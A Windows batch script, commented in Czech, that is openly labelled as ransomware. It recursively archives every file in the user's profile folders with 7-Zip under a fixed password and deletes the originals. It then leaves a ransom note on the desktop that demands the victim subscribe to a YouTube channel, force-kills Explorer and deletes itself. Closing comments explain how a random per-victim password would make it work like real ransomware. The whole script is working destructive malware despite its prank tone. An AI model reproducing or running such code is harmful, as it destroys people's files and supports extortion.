@echo off
color 4
title RANSOMWARE!!!
cd C:\Users\%username%
rem Spuštění ve všech složkách
for /d %%b in (*) do (
    cd %%b
    for /d %%c in (*) do (
        cd %%c
        for /d %%d in (*) do (
            cd %%d
            for /d %%e in (*) do (
                cd %%e
                for /d %%f in (*) do (
                    cd %%f
                    for /d %%g in (*) do (
                        cd %%g
                        for /d %%h in (*) do (
                            cd %%h
                            call :enc
                        )
                        call :enc
                    )
                    call :enc
                )
                call :enc
            )
            call :enc
        )
        call :enc
    )
    call :enc
)

rem Vytvoření souboru RANSOM.TXT na ploše
cd C:\Users\%username%\Desktop
echo ======================================================================= >> RANSOM.TXT
echo             VŠECHNY VAŠE SOUBORY JSOU ZAŠIFROVÁNY!!!!! >> RANSOM.TXT
echo ======================================================================= >> RANSOM.TXT
echo. >> RANSOM.TXT
echo Pokud chcete své soubory zpět, dejte odběr na kanál Grizlik :D a připojte se na jeho Discord >> RANSOM.TXT
echo Poté zjistíte, že odkaz na dešifrátor zní: https://github.com/Grizlikk/GrizlikYT >> RANSOM.TXT
echo V tuto chvíli všek nemáte tušení, že dešifrátor je na veřejném odkazu HAHAHAHAHA >> RANSOM.TXT
timeout /t 0 > nul
start RANSOM.TXT
taskkill /f /im explorer.exe
start cmd /c "del %0"
exit
rem Zašifrování souborů pomocí 7-zipu s heslem "Grizlik:DRansomware"
:enc
    for %%a in (*) do (echo Grizlik:DRansomware| "C:\Program Files\7-Zip\7z.exe" a -p "%%a.7z" "%%a" & del "%%a")
    cd..
goto :eof
rem Pokud bych do hesla napsal %random%, pak by pro každého uživatele bylo heslo jiné, takže by musel použít konkrétní dešifrovací klíč v RANSOM.TXT.
rem Většina reálných ransomwarů funguje právě takto, takže dešifrátor pro jednoho člověka nefunguje pro nikoho jiného